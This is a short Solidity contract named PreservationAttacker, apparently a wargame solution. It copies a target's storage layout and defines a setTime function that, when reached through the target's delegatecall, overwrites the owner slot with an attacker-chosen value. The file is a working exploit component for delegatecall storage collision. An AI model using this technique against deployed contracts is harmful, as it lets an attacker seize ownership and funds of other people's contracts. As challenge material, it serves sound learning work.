// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttacker {

  address public timeZone1Library;
  address public timeZone2Library;
  uint256 public owner;

  function setTime(uint256 _account) public {
    owner = _account;
  }
}